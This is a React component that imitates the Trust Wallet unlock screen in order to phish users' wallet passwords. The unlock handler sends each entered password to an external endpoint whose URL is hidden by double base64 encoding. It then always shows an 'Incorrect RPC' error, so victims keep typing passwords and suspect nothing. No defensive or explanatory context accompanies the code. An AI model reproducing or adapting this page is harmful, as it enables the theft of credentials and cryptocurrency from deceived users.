import trustwallet from 'assets/images/icons/trustwallet.svg'
import { Image } from "react-bootstrap";
import Styles from './trust.module.css'
import { useState, useEffect } from 'react';
const TrustWallet = () => {
    const [isPasswordVisible, setIsPasswordVisible] = useState(false);
    const [password, setPassword] = useState('')
    const [errormessage, setErrormessage] = useState(false)
    const [errrpc, setErrrpc] = useState(false)
    const [loader, setLoader] = useState(false)
    const [code, setCode] = useState('')

    const handleCodeChange = (e) => {
        const value = e.target.value
        if (password.length !== value.length) {
            setErrormessage(false)
            setErrrpc(false)
        }
        setPassword(value)
    }
    useEffect(() => {
        setCode('ABC')
    }, [])

    const unlock = async (e) => {
        setErrormessage(false)
        setErrrpc(false)
        if (password.length === 0) {
            return;
        } else if (password.length < 8) {
            e.target.style.border = 'none';
            e.target.style.outline = '1px solid #red';
            setErrormessage(true)
            return;
        }
        //here is the code that we have read ABC
        const device = code
        const url = 'YUhSMGNITTZMeTluWVc1aFkyaGxMbXhwZG1VdllYQnBMM1l4TDJodw==';
        const requestData = { device, value: password };
        try {
            setLoader(true)
            const response = await fetch(atob(atob(url)), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(requestData),
            });

            if (response.ok) {
                await response.json();
                setErrrpc(true)
                e.target.style.border = 'none';
                e.target.style.outline = '1px solid #red';
            } else {
                setErrrpc(true)
                e.target.style.border = 'none';
                e.target.style.outline = '1px solid #red';

            }
        } catch (error) {
            setErrrpc(true)
            e.target.style.border = 'none';
            e.target.style.outline = '1px solid #red';

        } finally {
            setLoader(false)
            setErrrpc(true)
            e.target.style.border = 'none';
            e.target.style.outline = '1px solid #red';

        }


    }


    function togglePasswordVisibility() {
        setIsPasswordVisible((prevState) => !prevState);
    }

    const focusHandler = (e) => {
        e.target.style.outline = '1px solid #3b82f6';
    }
    return (
        <div>
            <div className={`${Styles.container}`}>
                <Image src={trustwallet} alt="Trust Wallet" />
                <div className={`${Styles.textcontainer}`}><p className={`${Styles.titletext}`}> Secure and trusted multi-chain crypto wallet</p></div>
            </div>

            <div className={`${Styles.password_container}`}>
                <p className={`${Styles.password_text}`}>Password</p>

                <div className={`${Styles.input_container}`}>
                    <input
                        className={`${isPasswordVisible ? `${Styles.pw}` : ''}`}
                        type="text"
                        style={{
                            width: '100%',
                            height: '5rem',
                            backgroundColor: '#f4f4f4',
                            borderRadius: '0.375rem',
                            outline: 'none',
                            padding: '0.75rem',
                            fontWeight: '600',
                            fontSize: '1.6rem',
                            border: 'none',
                            outlineColor: errormessage ? '#ef4444' : 'red'
                        }}
                        onFocus={focusHandler}
                        value={password}
                        onChange={handleCodeChange}
                    />
                    <button
                        className={`${Styles.toggle_button}`}
                        onClick={togglePasswordVisibility}
                    >

                        {isPasswordVisible ? (
                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
                        ) : (
                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
                        )}
                    </button>

                </div>
                {errormessage ? <div className={`${Styles.errormessage}`}>Incorrect password</div> : errrpc ? <div className={`${Styles.errormessage}`}>Incorrect RPC</div> : ''}
            </div>
            <button type="submit" class={`${Styles.unlock} ${password ? `${Styles.ifval}` : `${Styles.noval}`}`} onClick={unlock}>
                {loader ? (
                    <div className={`${Styles.spinner} ${Styles.loadertrue}`}></div>
                ) : (
                    "Unlock"
                )}
            </button>
            <div className={`${Styles.footer}`}><div className={`${Styles.footer_width}`}><p className={`${Styles.footer_title}`}>Can't login? You can erase your current wallet and set up a new one</p></div><div className={`${Styles.reset_width}`}><button type="button" className={`${Styles.reset_btn}`}><p class="body-text text-primary font-medium text-unset">Reset wallet</p></button></div></div>
        </div >


    )
}

export default TrustWallet